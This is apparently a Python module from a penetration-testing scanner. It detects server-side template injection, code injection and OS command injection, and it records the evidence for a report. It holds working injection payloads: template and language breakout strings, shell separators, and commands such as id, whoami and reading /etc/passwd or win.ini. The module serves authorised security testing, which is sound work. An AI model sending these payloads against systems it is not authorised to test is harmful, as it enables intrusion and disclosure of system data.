"""
Command injection, server-side template injection and code evaluation.

These three are grouped because they share one confirmation idea: make the
server compute something it could only compute by *executing* what was sent,
and look for the answer in the response. Nothing harmful is run — the proof is
arithmetic.

  * **Template injection** sends ``${7*191}`` and its relatives and looks for
    1337 in the response. Each engine has its own syntax, and the syntax that
    works identifies the engine, which is worth knowing: Jinja2 and Freemarker
    are a short step from code execution, Smarty and Twig are further.

  * **Code evaluation** does the same for a language's own expression syntax.

  * **Command injection** runs real commands and reads their output back out
    of the response. A timed sleep is kept only as a last resort, and a
    finding that rests on timing alone is never called confirmed.

The echo-based proofs are strong: no error handler, cache or WAF produces the
number 1337 in response to ``${7*191}`` by accident.

On command injection specifically, timing is the weakest thing in this file
and the noisiest. Plenty of real applications are slow, slow in bursts, and
slow in ways that correlate with how much data a request asks for — all of
which can look like a sleep that scaled. So the command check now works the
other way round: it proves execution by running ``id``, ``whoami``,
``uname -a`` and ``cat /etc/passwd`` (or their Windows equivalents) and
finding their output in the response. That output is the finding, it is the
screenshot that goes in the report, and it is something the tester can
reproduce by hand in one request.
"""

from __future__ import annotations

import re
import secrets

from command_bridge.modules.scanner.model import Evidence, ScanFinding, \
    response_summary, step
from command_bridge.modules.scanner import oracles

#: 7 * 191 = 1337, which does not appear on a normal page the way 49 does.
CANARY_RESULT = "1337"

TEMPLATE_PAYLOADS = (
    ("Jinja2 / Twig", "{{7*191}}"),
    ("Jinja2 (statement)", "{{'7'*1}}{{7*191}}"),
    ("Freemarker", "${7*191}"),
    ("Velocity", "#set($x=7*191)$x"),
    ("ERB / Ruby", "<%= 7*191 %>"),
    ("Smarty", "{7*191}"),
    ("Handlebars-style", "{{#with 7}}{{/with}}{{7*191}}"),
    ("Angular / Vue", "{{constructor.constructor('return 7*191')()}}"),
)

CODE_PAYLOADS = (
    ("PHP", ";print(7*191);"),
    ("PHP", "');print(7*191);//"),
    ("Python", "'+str(7*191)+'"),
    ("Ruby", "#{7*191}"),
    ("JavaScript", "';return 7*191;//"),
)

#: Separators that get a second command run.
COMMAND_SEPARATORS = (";", "|", "||", "&&", "\n", "`{cmd}`", "$({cmd})")
COMMAND_ECHO = "expr 7 \\* 191"
COMMAND_TIME = "sleep {d}"
WINDOWS_TIME = "ping -n {d} 127.0.0.1"

#: The commands run once execution is established, purely to produce evidence.
#: All of them read; none of them write, delete, connect outwards or touch
#: anything a client would mind. ``/etc/passwd`` is the conventional proof and
#: contains no password hashes on any system built this century, but it is
#: truncated anyway — the first few lines prove the read, and the rest is the
#: client's user list, which does not belong in a scanner's memory.
UNIX_EVIDENCE = (
    ("id", "id"),
    ("whoami", "whoami"),
    ("uname -a", "uname -a"),
    ("pwd", "pwd"),
    ("cat /etc/passwd", "head -n 5 /etc/passwd || cat /etc/passwd"),
)

WINDOWS_EVIDENCE = (
    ("whoami", "whoami"),
    ("ver", "ver"),
    ("dir C:\\", "dir C:\\"),
    ("type C:\\windows\\win.ini", "type C:\\windows\\win.ini"),
)


class TemplateInjectionCheck:
    key = "ssti"
    name = "Server-side template injection"
    issue = "ssti"

    def applies(self, point, profile):
        return True

    def run(self, ctx, point, baseline):
        for engine, payload in TEMPLATE_PAYLOADS:
            request = point.build(payload, mode="replace")
            response = ctx.auth.send(request)
            if response is None:
                continue
            body = response.text or ""
            if CANARY_RESULT not in body:
                continue
            # The payload must not simply be echoed back: a page that reflects
            # {{7*191}} verbatim has not evaluated anything.
            if payload in body:
                continue
            confirm = point.build(payload.replace("7*191", "6*191"),
                                  mode="replace")
            second = ctx.auth.send(confirm)
            if second is None or "1146" not in (second.text or ""):
                continue
            return [ScanFinding(
                issue=self.issue,
                where=point.request.url,
                point=point.label(),
                confidence="confirmed",
                detail_extra=f"The template engine evaluated an expression "
                             f"supplied in this parameter. The syntax that "
                             f"worked points to {engine}. Two different "
                             f"expressions were evaluated correctly, so this "
                             f"is not a reflection.",
                evidence=[
                    step(f"{payload} evaluated to {CANARY_RESULT}",
                         request, response, auth=ctx.auth, payload=payload,
                         decisive=True, body_limit=300),
                    step("A second expression, to rule out a coincidence",
                         confirm, second, auth=ctx.auth, body_limit=300,
                         note="6*191 = 1146")])]
        return []


class CodeInjectionCheck:
    key = "code"
    name = "Server-side code injection"
    issue = "code_injection"

    def applies(self, point, profile):
        return True

    def run(self, ctx, point, baseline):
        for language, payload in CODE_PAYLOADS:
            for mode in ("append", "replace"):
                request = point.build(payload, mode)
                response = ctx.auth.send(request)
                if response is None:
                    continue
                body = response.text or ""
                if CANARY_RESULT in body and payload not in body:
                    return [ScanFinding(
                        issue=self.issue,
                        where=point.request.url,
                        point=point.label(),
                        confidence="confirmed",
                        detail_extra=f"An expression supplied in this "
                                     f"parameter was evaluated by the "
                                     f"application. The syntax suggests "
                                     f"{language}.",
                        evidence=[step(
                            f"{payload} evaluated to {CANARY_RESULT}",
                            request, response, auth=ctx.auth, payload=payload,
                            decisive=True, body_limit=300)])]
        return []


class CommandInjectionCheck:
    """Prove the shell ran something, then make it say what it is.

    The order matters and is the whole point of the rewrite. Execution is
    established with a cheap, platform-neutral echo of a random token — no
    arithmetic to confuse with page content, no sleep to confuse with a slow
    server. Only once a separator is known to work does the check spend
    requests running ``id``, ``whoami``, ``uname -a`` and ``cat /etc/passwd``,
    and it records each one as its own evidence step so the report shows the
    commands and their output side by side.
    """

    key = "cmdi"
    name = "OS command injection"
    issue = "command_injection"

    def applies(self, point, profile):
        return True

    def run(self, ctx, point, baseline):
        proven = self._execute(ctx, point, baseline)
        if proven:
            return [proven]
        if getattr(ctx.profile, "timing_checks", False):
            timed = self._timed(ctx, point, baseline)
            if timed:
                return [timed]
        return []

    # ── establishing that a shell ran ────────────────────────────────────
    def _execute(self, ctx, point, baseline):
        """Find a working separator, then capture real command output."""
        canary = "CB" + secrets.token_hex(4).upper()
        baseline_body = getattr(baseline, "body", "") or ""

        for separator in COMMAND_SEPARATORS:
            for command in (f"echo {canary}", COMMAND_ECHO):
                payload = (separator.format(cmd=command)
                           if "{cmd}" in separator
                           else f"{separator} {command}")
                expected = canary if command.startswith("echo") \
                    else CANARY_RESULT
                for mode in ("append", "replace"):
                    request = point.build(payload, mode)
                    response = ctx.auth.send(request)
                    if response is None:
                        continue
                    body = response.text or ""
                    if expected not in body:
                        continue
                    # Reflection is not execution. If the whole payload came
                    # back, or the token is still sitting next to the word
                    # that was supposed to print it, nothing ran.
                    if payload in body or f"echo {expected}" in body:
                        continue
                    if expected in baseline_body:
                        continue
                    return self._capture(ctx, point, separator, mode,
                                         request, response, payload,
                                         command, expected, baseline_body)
        return None

    # ── making it produce something worth screenshotting ─────────────────
    def _capture(self, ctx, point, separator, mode, first_request,
                 first_response, first_payload, first_command, expected,
                 baseline_body):
        """Run the read-only evidence commands through the proven separator."""
        proof_step = step(
            f"Shell execution proved with '{separator}'",
            first_request, first_response, auth=ctx.auth,
            payload=first_payload,
            note=f"`{first_command}` printed {expected}. Nothing was written, "
                 f"deleted or sent anywhere.")
        evidence = [proof_step]

        observations, platform = [], ""
        for family, commands in (("unix", UNIX_EVIDENCE),
                                 ("windows", WINDOWS_EVIDENCE)):
            if platform and platform != family:
                continue
            for shown, actual in commands:
                payload = (separator.format(cmd=actual)
                           if "{cmd}" in separator
                           else f"{separator} {actual}")
                request = point.build(payload, mode)
                response = ctx.auth.send(request)
                if response is None:
                    continue
                body = response.text or ""
                if payload in body:
                    continue
                matches = oracles.command_output(body, baseline_body, payload)
                matches = [m for m in matches if m[1] == family]
                if not matches:
                    continue
                strong = oracles.decisive_command_output(matches)
                description = (strong or matches[0])[2]
                extract = (strong or matches[0])[3]
                evidence.append(step(
                    f"`{shown}` → {description}",
                    request, response, auth=ctx.auth, payload=payload,
                    note=f"Returned: {extract}", body_limit=800))
                observations.append((shown, description, extract))
                if strong is not None and not platform:
                    platform = family
            if platform == family:
                break

        # Which step leads the proof of concept. The token echo is what
        # *proved* execution, but the request worth putting in front of a
        # client — and in a screenshot — is the one whose response contains
        # `uid=0(root)` or the contents of /etc/passwd. So a step that
        # returned real output leads where there is one, and the echo leads
        # only when the injection turned out to be blind.
        lead = next((item for item in evidence[1:]
                     if item.label.startswith(("`cat", "`id", "`type"))),
                    evidence[1] if len(evidence) > 1 else proof_step)
        lead.decisive = True

        if observations:
            ran = ", ".join(f"`{name}`" for name, _, _ in observations)
            detail = (
                f"A second command supplied in this parameter was executed by "
                f"the operating system. Execution was first proved by having "
                f"the shell print a random token ({expected}), then "
                f"demonstrated by running {ran} and reading the output back "
                f"out of the response. "
                + " ".join(f"{description.capitalize()}: {extract}"
                           for _, description, extract in observations[:3])
                + " Every command used was read-only.")
        else:
            # The shell ran, but this response does not return its output —
            # blind injection. That is still command injection and still
            # confirmed, and the report should not pretend there is a
            # screenshot to take.
            detail = (
                f"A second command supplied in this parameter was executed by "
                f"the operating system: the shell was asked to print the "
                f"random token {expected} and the response contains it, while "
                f"the payload itself was not reflected. Follow-up commands "
                f"({', '.join(name for name, _ in UNIX_EVIDENCE)}) did not "
                f"return their output in the response, so this is a blind "
                f"injection — the command runs but the page does not show it. "
                f"To screenshot it, re-send the proven request below with a "
                f"command of your own.")

        if oracles.COMMAND_ERRORS.search(first_response.text or ""):
            detail += " The response also contains shell error output."

        return ScanFinding(
            issue=self.issue,
            where=point.request.url,
            point=point.label(),
            confidence="confirmed",
            detail_extra=detail,
            evidence=evidence)

    # ── the last resort ──────────────────────────────────────────────────
    def _timed(self, ctx, point, baseline):
        """A sleep that scaled — reported, but never as proof on its own.

        A slow application is the normal case, not the exception, and a
        timing result on one is not something a tester can put in front of a
        client. So when timing fires, the check immediately tries to turn it
        into real output through the same separator; if that works the
        finding is upgraded to a confirmed one with the command output
        attached. If it does not, the result is reported at tentative
        confidence, which the evidence layer renders as POTENTIAL with
        "manual validation required" rather than as a confirmed critical.
        """
        timing = oracles.Timing(ctx.auth, baseline, ctx.profile.delay_seconds)
        for separator in (";", "|", "&&", "`{cmd}`", "$({cmd})"):
            for command in (COMMAND_TIME, WINDOWS_TIME):
                template = (separator.format(cmd=command)
                            if "{cmd}" in separator
                            else f"{separator} {command}")
                for mode in ("append", "replace"):
                    result = timing.test(point, template, mode)
                    if not result:
                        continue
                    # Try to replace the timing argument with a real one.
                    upgraded = self._capture_blind(ctx, point, separator, mode,
                                                   baseline)
                    if upgraded is not None:
                        return upgraded
                    if not getattr(ctx.profile, "report_timing_only", False):
                        # The operator asked not to be shown these, because on
                        # a slow application they are mostly the application
                        # being slow. Nothing is reported.
                        return None
                    return self._timing_finding(point, result)
        return None

    def _capture_blind(self, ctx, point, separator, mode, baseline):
        """Having found a separator by timing, see if it will talk."""
        canary = "CB" + secrets.token_hex(4).upper()
        baseline_body = getattr(baseline, "body", "") or ""
        payload = (separator.format(cmd=f"echo {canary}")
                   if "{cmd}" in separator
                   else f"{separator} echo {canary}")
        request = point.build(payload, mode)
        response = ctx.auth.send(request)
        if response is None:
            return None
        body = response.text or ""
        if canary not in body or payload in body or f"echo {canary}" in body:
            return None
        return self._capture(ctx, point, separator, mode, request, response,
                             payload, f"echo {canary}", canary, baseline_body)

    def _timing_finding(self, point, result):
        return ScanFinding(
            issue=self.issue,
            where=point.request.url,
            point=point.label(),
            # Not 'confirmed'. A delay is consistent with command injection
            # and with half a dozen other things, and calling it confirmed is
            # how a scanner ends up being ignored.
            confidence="tentative",
            detail_extra=(
                f"TIME-BASED EVIDENCE ONLY — MANUAL VALIDATION REQUIRED. "
                f"Asking for {result['short_delay']}s took "
                f"{result['short_time']}s and asking for "
                f"{result['long_delay']}s took {result['long_time']}s, "
                f"against a normal response time of "
                f"{result['baseline_median']}s. The delay scaled with the "
                f"number in the payload, which is what a real sleep looks "
                f"like. No command output was recovered: a follow-up "
                f"`echo` through the same separator returned nothing, so the "
                f"scanner could not prove execution. On an application that "
                f"is slow, or slow in proportion to how much work a request "
                f"asks for, this pattern also occurs without any injection. "
                f"Validate by hand before reporting it."),
            evidence=[
                step(f"{result['short_delay']}s requested → "
                     f"{result['short_time']}s",
                     result["short_request"], auth=result.get("auth"),
                     payload=result.get("short_payload", "")),
                step(f"{result['long_delay']}s requested → "
                     f"{result['long_time']}s",
                     result["long_request"], result.get("response"),
                     auth=result.get("auth"),
                     payload=result.get("long_payload", ""),
                     decisive=True,
                     note=f"Normal responses never exceeded "
                          f"{result['baseline_ceiling']}s; a zero-second "
                          f"sleep took {result.get('control_time', '?')}s. "
                          f"This is circumstantial, not proof.")])
